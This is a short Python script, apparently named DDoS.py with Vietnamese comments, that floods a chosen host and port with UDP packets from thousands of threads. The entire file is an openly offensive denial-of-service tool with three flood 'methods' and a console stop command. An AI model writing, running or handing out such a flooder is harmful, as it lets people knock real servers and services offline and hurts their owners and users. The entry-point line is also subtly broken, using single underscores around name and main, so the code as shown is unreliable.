import sys
import socket
import threading
import time

running = True  # Biến điều khiển vòng lặp

def send_packet(host, port, amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while running:
            s.sendto(b"\x99" * amplifier, (host, port))
            time.sleep(0.01)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

def attack():
    global running
    
    if len(sys.argv) < 4:
        print("Usage: python DDoS.py <host> <port> <method>")
        print("Methods: UDP-Flood, UDP-Power, UDP-Mix")
        return

    host = sys.argv[1]
    port = int(sys.argv[2])
    method = sys.argv[3]
    loops = 10000

    methods = {
        "UDP-Flood": [375],
        "UDP-Power": [750], 
        "UDP-Mix": [375, 750]
    }

    if method not in methods:
        print("Invalid method!")
        return

    print(f"Starting attack on {host}:{port} ({method})")
    print("Type '/thoat' to stop")

    # Khởi chạy các thread tấn công
    threads = []
    for _ in range(loops):
        for amp in methods[method]:
            t = threading.Thread(
                target=send_packet,
                args=(host, port, amp),
                daemon=True
            )
            t.start()
            threads.append(t)
        time.sleep(0.05)

    # Luồng kiểm tra lệnh dừng
    def check_exit():
        global running
        while True:
            cmd = input()
            if cmd == '/thoat':
                running = False
                print("Stopping attack...")
                break
    
    exit_thread = threading.Thread(target=check_exit, daemon=True)
    exit_thread.start()

    # Chờ các luồng hoàn thành
    for t in threads:
        t.join()

    print("Attack stopped")

if _name_ == "_main_":
    attack()
